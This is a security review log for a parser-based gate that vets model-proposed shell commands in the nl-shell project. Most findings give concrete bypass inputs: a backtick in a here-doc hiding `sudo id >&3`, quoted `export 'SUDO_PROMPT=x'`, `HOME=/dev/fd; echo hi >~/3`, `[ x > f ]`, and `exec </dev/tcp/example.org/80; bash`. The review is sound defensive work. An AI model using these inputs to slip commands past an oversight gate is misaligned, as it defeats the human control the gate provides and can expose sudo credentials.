- [x] **High (same rating basis as above; latent High for a hidden privileged step).** `src/nl_shell/gate/parse.py:413-459` and `:835-874` (`_heredoc_redirect`). Input: a proposal with a backtick substitution in the body of an **unquoted** here-doc, `cat <<E⏎`sudo id >&3`⏎E`. tree-sitter-bash 0.25.1 parses the body as a plain `heredoc_body` with no `command_substitution` node. Its tree is `(program (redirected_statement body: (command …) redirect: (heredoc_redirect (heredoc_start) (heredoc_body) (heredoc_end))))`. The gate sees one invocation, `cat`, and no fd-3 redirect. The proposal is `mutating`, "not allowlisted", and not rejected. Bash runs the backtick in a here-doc body: `bash hd.sh 3>fd3b.txt` (body `` `echo hi >&3` ``) wrote `hi` into `fd3b.txt`. `$(…)` in the same place *is* parsed and rejected, so only backticks get through. The stdin fact is still correct (`unknown`, because the body holds a backtick, `parse.py:873`), but the hidden command and redirect are never judged. **Why [human]:** same routing question as the bullet above. The narrow fix is to make "unquoted-delimiter here-doc body holding a backtick" a Rule 1 untrusted feature. No test covers it.
- [x] **High (latent today: "a session change goes undetected by the gate"; once sudo passthrough #13 lands, a `SUDO_PROMPT` override that slips past §5 is on the path to the Critical sudo-password row).** `src/nl_shell/gate/__init__.py:229-240` (`_assignments`) only sees `variable_assignment` nodes. Input: a proposal `export 'SUDO_PROMPT=x'`, `export SUDO_\PROMPT=x` or `export "SUDO_PROMPT"=x`. All three are `mutating`, not rejected, with no "SUDO_" reason. Bash assigns in all three (`bash -c "export 'SUDO_PROMPT=x1'; echo \$SUDO_PROMPT"` prints `x1`; the other two print `x2` and `x3`). The same forms get around §3: `export 'PATH=./bin'` is not `session-altering`. The threat model says "The gate rejects … overrides of `SUDO_PROMPT` and `SUDO_ASKPASS`" (`threat_model.md:121-122`). **Why [human], and not re-raised as new work:** the brief parks "variable writes the tree gives no `variable_assignment` node for" as a follow-up (`brief.md:289-291`). These forms fit that class, but the parked examples (`for PATH in …`, `read`, `printf -v`) don't list them. The human should confirm the follow-up covers quoted or escaped declaration-builtin arguments for the §5 names. If it does, nothing is needed here.
- [x] **Hidden second change with a live test on it.** Brief line 229-230 puts "an update to `.oss-scanner/threat_model.md` that states the six rules as the gate's properties" in scope. The issue body's scope list (notes.json: pins, `gate/`, §1.1 check, vectors + loader, test file) does not include it, and brief line 258 says the spec text for the raises is "#197's spec edit, not this child's" — so this child edits the threat model but not the spec it claims to implement. Worse, `tests/test_failure_classes.py:827-839` pins the "## Known gaps" section: exactly one bullet may mention `failure_classes`, and it must still contain `#12`, `bash -c`, `PATH`, `trap`, `PROMPT_COMMAND` and `2>&1 sud`. That bullet (`threat_model.md:195-209`) ends "#12 closes this" — a natural target for a Do that is "stating the gate's properties". Either drop the threat-model edit from this child, or constrain it to the "What we rely on" section and say outright that the Known-gaps `failure_classes` bullet must not change.
- [x] **The success criterion points at tables that are not in the brief.** Rule 1's criterion reads "for every input in the untrusted table below" (line 119) and Rule 2's "for every input in the regression table" (line 126); brief line 3-6 says every v1-v6 case "is now a regression input". No such table exists anywhere in `brief.md`, and the v1-v6 cases live in `results/issue_196/iteration-v1..v6/` in the pdca checkout (line 267-268), which is not part of this bundle. Do cannot know the row set, and a reviewer cannot judge completeness of "one regression table". Inline the rows (or the untrusted-feature inputs at minimum) in the brief, or point to a file that ships in the bundle.
- [x] **The gate-vectors file format is undefined, so the loader criterion is untestable as written.** Line 192-194 requires the loader to reject "a missing `command` or `class`, a class outside the five, an unknown key", but the brief never states the known key set. Two things the format must express are left to Do: (a) rejected rows — spec rows 21-25 and 30 (`v1.md:273-277,282`) have *no* class, only "rejected", and the brief defines a class only for decision C (`privileged`), not for a §5 rejection like `echo hi >&3`; (b) origin — Rule 1 makes proposal-vs-typed decisive for the result, so a vector row needs it. Fix by naming the keys (`command`, `class`, `rejected`, `origin`, `reason`?) and the class a rejected-by-§5 row carries, so "unknown key" and the row assertions have one meaning.
- [x] **Rule 5's criterion is a wall-clock assertion.** Line 153-154: "`$[`, `a=(` and `${` repeated to exactly 8 KiB each classify in under 1 s on the host". CI (`.github/workflows/tests.yml:14-23,28-54`) runs the suite four times on `ubuntu-latest` shared runners; a timing bound measured as 0.14 s on the planner's host (line 103-104) is a flake source there and makes a later Check unfalsifiable in the other direction (a slow runner "fails" correct code). Suggest the deterministic parts stay gating (size cap at 8 KiB + 1 byte → decision C; budget overrun → decision C) and the sub-second figure becomes a non-gating measurement or a generous `pytest.mark` with an explicit margin rationale.
- [x] **The pins were verified only in the pdca `.venv`, not against CI's interpreter.** Line 200-202: "`tree-sitter` 0.26.0 and `tree-sitter-bash` 0.25.1 are installed in the pdca `.venv`". CI installs with `python -m pip install --quiet -e '.[dev]'` on **Python 3.14** (`tests.yml:19-21`, and again at `:39,49` for the bash matrix). Both packages are C extensions; whether 0.26.0 / 0.25.1 publish cp314 wheels or build from sdist on the runner is not stated. If they don't, every CI job fails at *Install*, before a single test runs. The brief's Impact section (line 271-274) should state the CI install check, not only the license question.
- [x] **The Rule 1 "human ruling" has no tracker record and makes code contradict the normative spec text for a window.** Brief line 45: "*Untrusted outcome (human ruling):* a model **proposal** is rejected." The issue body (notes.json) says the opposite: "§1.2 unparseable: row 31 (`if true; then`) is `mutating`, reason contains 'unparseable'", matching `policy-gate/v1.md:63-64` and ADR-0013 line 39-40 ("counts as mutating"). The only comment on #196 is the triage bot, so the ruling exists only in the brief. The brief does list it for sign-off (line 254) and defers the spec edit to #197 (line 258), but that means `main` will carry a gate whose behaviour the spec it cites says is wrong until #197 lands. The human should either record the ruling on the issue, or move the one-line §1.2 spec edit into this child's scope so code and contract land together.
- [x] **Rule 1 leaves an implementation choice open that changes its own criterion.** Line 40-41: backslash-newline is an untrusted feature "unless the gate first removes it the way bash does". If Do implements the removal, the tree is trusted and the Rule 1 criterion "the typed version is at least `mutating`, with 'unparseable' in a reason" (line 121-122) is false for those inputs; if Do doesn't, `echo hi >\⏎&3` and `echo d 3\⏎>x` (line 124-125) are caught by the untrusted-redirect clause rather than Rule 4. Both are defensible; the brief should pick one so the test asserts one reason, not two possible ones.
- [x] T5 Judgment — Approve decision C, stricter descriptor rejection and quote-blind hidden-character rejection, confirm parser dependency licensing, and settle affected-path prior art across merged and closed/rejected work — the disposable repository has only one base commit and no remotes, so complete history cannot be checked; target/docs/design/specs/policy-gate/v1.md:238, target/pyproject.toml:19, brief.md:127 and brief.md:139.
- [x] **Assignments the parser does not give a `variable_assignment` node skip §3 and §5.** The brief limits the rule to `variable_assignment` nodes (`parse.py:701-711`). But the forms below are syntax the shell layer walks, not commands, so #197's command layer will never see them as invocations. `for` and `expansion` are plain pass-through containers (`parse.py:736-749`):
- [x] **T2 is unverifiable: no threat-model update.** `gate-logs/T2-threat-model.log` shows the whole new gate package changed with no edit to `.oss-scanner/threat_model.md`. The brief cites that model's Critical row (`:296`) and High row (`:303`) as the invariant this work restores. A human should decide whether the model needs a new row now (the gate as a parse-differential surface: tree-sitter vs bash, see `cat <<E; rm x` below) or only when #78 wires the gate into the REPL.
- [x] **No effect in this diff. It becomes High ("pipes into sudo" must be rejected, ADR-0015) once child-2's sudo-pipe rule reads `Invocation.stdin`.** At `src/nl_shell/gate/parse.py:714-719`, a function body is always walked with `stdin=TERMINAL`. But the body runs with the stdin of the call site. Input: the model's proposal. Example: `f() { sudo tee /x; }; cat <<E | f` (here-doc body `x`). The call `f` gets stdin = pipe, but the `sudo tee /x` invocation is recorded as reading the terminal. That is the same mistake the brief cites as v2's here-doc pipeline bug, moved into a function body. Calling `f` is opaque and the definition is `session-altering`, so the command is still confirmed. But a pipe-into-sudo *rejection* built on this field would not fire, and the sudo password could be fed from the pipe. The brief's `Stdin` sources (terminal / pipe / file / here-doc / here-string) have no "unknown" value for this case. Adding one, or making #197 treat function-body invocations as stdin-unknown, changes the contract the siblings depend on. That is a scope call for the human, not a builder iteration.
- [x] **The tracker record is missing, so the problem statement and the "ignored context" check could not be done.** `notes.json` and `sources/` are not in the bundle I was given. Several parts of the brief rest only on that thread: "decision A's floor", "decision B (child-2)", "Decision C", "child-2" and "child-3", the sibling split (#190/#191/#192) and the "v2 regression". None of the decisions A/B/C appear anywhere in the target. A grep for `decision [ABC]` and `could not class` matches only `.github/triage/triage_priority.py:42,402`, which is unrelated. The human should confirm these decisions really are in the thread, or the brief should state them inline.
- [x] **The "§7 stub proof" criterion cannot fail.** The brief ships `rules.py` as a stub where "every simple command is `mutating`, reason 'not allowlisted'". With that stub, nothing reaches `gate/live.py` as `read-only`. So "no case returns `read-only`" passes even if `live.py` is deleted or returns `read-only`. The same applies to "§1.7 … a label never lowers the class": every command is already at least `mutating`, so a label below that can never be observed lowering anything. The tests need to exercise `live.py` directly, for example by monkeypatching `rules` to return `read-only` and asserting that live turns it into `mutating` with "live-session resolution not implemented". The label test needs a matching fixture. Otherwise these two bullets pass whether or not the code works.
- [x] **Decision C and the fd rule go beyond the spec. The brief calls them restorations; they are new rules.** `policy-gate/v1` has no internal-error or budget rule. Decision C ("`privileged`, rejected, reason 'could not class'") is new. The spec rejects only "file descriptor 3 or higher" (`docs/design/specs/policy-gate/v1.md:126`). The brief also rejects any descriptor the gate "cannot prove is below 3" (`>&$x`, `<&$fd`, `2>&${FD}`). Both are stricter, so they are probably compatible changes. But the spec's Versioning section (`v1.md:238-241`) says raising a class "MUST be reviewed by a human". The brief does not flag either one for sign-off, and does not plan a spec edit to record them.
- [x] **The §3 variable rule is underspecified and only partly tested.** The success criterion tests standalone assignments to `PATH`, `IFS`, `LD_PRELOAD` and `GIT_DIR` only. Spec §3 (`v1.md:104-107`) lists about 20 names and patterns (`PS0`–`PS4`, `LD_*`, `GIT_*`, `SUDO_*`, `PYTHON*`, `PERL5*`, `NODE_OPTIONS`, …) and covers them "standalone **or exported**". The brief applies the `variable_assignment`-inside-`declaration_command` handling only to `SUDO_*`. It never says whether `export PATH=./bin` (the setup for spec row 5) gets `session-altering` from the shell layer, or ends up as just `mutating` from the stub, which loses the session-altering warning. The Scope section also never says whether the full §3 list is in this child or in child-2. Do will have to guess.
- [x] **`gate-vectors.toml` and its loader are a hidden second change that no test checks.** Scope adds `targets/ubuntu-26.04/gate-vectors.toml` "with this child's rows and a vector loader in the style of `src/nl_shell/targets.py:145-247`". No success-criterion bullet says the tests read their cases from that file, or tests the loader (missing file, bad TOML, schema). That is new data, a new module and new review surface with no red→green test. The spec also says a target's vectors file "MUST cover every row" (`v1.md:245-249`), so a partial file under that name does not meet the spec. Either drop it, or add a criterion such as "the tests read every case from the file; the loader rejects malformed entries" and say how the file relates to the full-row requirement.
- [x] **Two citations do not resolve in the target.** `engine/scripts/run-verify.sh:196` (Falsifiability) and `results/issue_189/iteration-v2/patch.diff` with `parse.py:397,411` (Prior-art) are not in `$PDCA_TARGET`. A glob of `engine/**` and `results/**` matches nothing. They probably live in the PDCA harness checkout. The rule that Do "must cite path:line on the target branch" can't be applied to them, and a Do agent grounded on the target can't open them. Prior-art also says the v2 here-doc handling "is the bug listed above", but the brief never states that bug. The only mention is the bullet header "Stdin context, v2 regression". One sentence describing the v2 defect (stdin of the second pipeline stage recorded as terminal after a here-doc) would close the gap.
- [x] **The §1.1 check is stricter than the spec, and the brief doesn't say so.** The brief reuses `render.has_hidden` (`src/nl_shell/render.py:136`). That function ignores quoting and covers Cf/Co/Cn/default-ignorable/surrogates (`render.py:113-127`). The spec forbids the listed characters only "outside quotes" (`v1.md:59-61`). That is fine for safety, since it only raises the class or rejects. But it means a proposal like `echo '‮'` is rejected, which differs from the spec text. A sign-off note should record that this deviation is deliberate.
- [x] **These pinned-version claims can't be checked from the target and are load-bearing.** "tree-sitter-bash 0.25.1 has 59" named node kinds, the compatibility of `tree-sitter==0.26.0` with `tree-sitter-bash==0.25.1`, and "`case x in` parses to an `ERROR` node; `if true; then` to `MISSING "fi"`" are all assertions about third-party wheels. Nothing in the repo backs them up (`pyproject.toml:13-17` has no tree-sitter today). If either pin is wrong, Do stalls on the first install. The success criterion already makes the node-kind test enumerate the kinds at run time, so the brief should drop the hard-coded "59" rather than imply a test depends on it. The pins should be confirmed with one `pip install` before Do starts. The licence question is already deferred to sign-off.
- [x] T5 Judgment — Confirm dependency licensing and complete affected-path prior-art review across merged and closed/rejected work before sign-off — the brief flags the licensing decision, while this target has one synthetic base commit, no remotes and no gate-path history; closed-work evidence and INTEGRATION §4 are not supplied (brief.md:142, brief.md:145; target/pyproject.toml:20).
- [x] **Scope of "cannot prove": non-literal redirect targets and unparseable text.** The new threat-model line (`threat_model.md:120-121`) promises rejection of any redirection the gate cannot prove uses only fds 0-2. The code keeps two cases at `mutating`, not rejected. (1) A non-literal output target, `echo x >"$f"` or `>/proc/$$/fd/3` (`parse.py:519-525`): its value is unknown, so it could be `/dev/fd/3`. (2) Text that parses with an `ERROR` node (`parse.py:788`, `__init__.py:124-125`): a `>&3` that tree-sitter folds into the `ERROR` node never becomes a `file_redirect`, so it gets only "unparseable" (`mutating`). Until #191 that is an accepted bypass class (`threat_model.md:227-228`). Both still need a confirm. Rejecting every non-literal output target is a large behaviour change, so a human should decide which way to go. Option one: narrow the threat-model wording to literal targets on a parseable tree. Option two: add backstops, such as rejecting non-literal output targets, and rejecting unparseable text whose bytes match `[<>]&|/dev/fd/|/proc/[^/]*/fd/`. I found no concrete grammar input for (2), and it is unconfirmed without the toolchain.
- [x] T5 Judgment — Confirm dependency-license acceptability and the affected-path prior-art check across merged and closed/rejected work: local history contains only a synthetic base and no remotes, so the brief’s historical check cannot be independently confirmed here (pyproject.toml:19; brief.md:312).
- [x] **Rule 4's leading-`~` allowance lets a redirect reach fd 3 (nl-shell's control channel, ADR-0014).** `parse.py:326-331` accepts a `~/…` target and skips the `/dev`, `/proc`, `/sys` check for it, and `HOME` is not in `_SESSION_NAMES` (`__init__.py:51-76`). Typed `HOME=/dev/fd; echo hi >~/3` and `HOME=/proc/self/fd; echo hi >~/3` come out `mutating`, **not rejected**, with only "output redirection". In bash, `bash -c 'HOME=/dev/fd; echo hi >~/3' 3>fd3.txt` writes `hi` to fd 3. The related case `cd /dev/fd && echo hi >3` is also accepted. The brief's out-of-scope note covers only the *session's* cwd, not a `cd` on the same line. The code follows the brief as written ("apart from an optional leading `~`"), so the gap is in the brief. A human should decide between rejecting `~` targets whenever `HOME` is assigned anywhere in the line, adding `HOME` to the §3 list, or recording this as a known gap. The build notes' sign-off list does not mention it.
- [x] **`terminal` stdin is claimed without proof after `exec` redirects the shell's fd 0.** `parse.py:708-710` works out stdin only from the command's own redirects plus the redirects of the structures around it. `exec </dev/tcp/example.org/80; bash` gives `bash` stdin `terminal`, and `exec <f; sudo bash` gives `sudo bash` stdin `terminal`. In bash, every later command reads from that file or socket (`exec </dev/null; cat` reads `/dev/null`). Because `terminal` is not the worst case for the sudo-pipe rule or for decision B, #197 would be told the input is safe when it is not. `coproc sudo tee /x` also gives `terminal`, but a coproc's stdin is a pipe. The code matches the brief's definition of `terminal`. That definition does not cover a stdin change that carries over to later commands, so a human has to choose: make every command after a fd-0 `exec` `unknown`, or move this to #197 explicitly.
- [x] **Critical once `[` or any allowlisted command can be read-only; today the floor holds (`mutating`, confirm).** `src/nl_shell/gate/parse.py:918` (`test_command` falls to the generic `_children` handler) and the new threat-model text at `.oss-scanner/threat_model.md:174`. Input: a single-bracket test `[ … ]` holding a bare `>`, `>>` or `<`. tree-sitter-bash reads it as a comparison (`(test_command (binary_expression …))`), but bash treats `[` as a simple command and the `>` as a redirect. I confirmed this with bash: `[ x > trunc_me ]` creates an empty `trunc_me`. The gate records **no redirect and no invocation** for it:

## 7. Proven / not proven
- Proven by which oracle: gates overall = pass (stub oracles).
- Unproven / needs manual run: anything flagged in §6.

## 8. Ready-to-ship attachments
- patch.diff
- tracker-comment.md     (ALWAYS, every tracker item)
- build-notes.md         (builder rationale — for the human, not the reviewer)

## 9. Check sign-off                     ← human completes Check here
- Disposition confirmed / overridden:
- Outcome: merged-wider
- Iteration delta (if iterating):
- By / date: Eduard Ralph / 2026-10-24

## 10. Act candidates (hints for the next Act review)
- Plan advisory: 7 finding(s); brief revised: yes (plan-advisory-*.md)
- (empty is the common case)
- #196 follow-up: 4 small fixes — non-literal command word makes prefix assignments standalone (`PATH=/tmp/evil $(true)`); `trap` counts as a stdin rewire; `coproc` stdin → `unknown`; `</dev/stdin` → `unknown`, not `file`.
- #196 follow-up (security): nested backticks and a backtick in an unquoted here-doc body hide commands and fd-3 redirects — add to Rule 1's untrusted list or #191's differential test.
- #196 follow-up (security): quoted/escaped `export 'SUDO_PROMPT=x'` / `export 'PATH=…'` bypass §5/§3 — confirm the parked "no `variable_assignment` node" follow-up covers them.
- #196 follow-up (security): `HOME=…; echo >~/3` and `cd /dev/fd && echo >3` reach fd 3; `[ x > f ]` hides a redirect; decide threat-model wording for non-literal redirect targets.
- #196 follow-up: record the proposal-rejection ruling (Rule 1 vs spec §1.2) on the issue or as a spec edit.
- Act: #196 took 8 rounds as each review found new parser-vs-bash cases — consider starting such leaves with a differential test against bash instead of hand-picked cases.
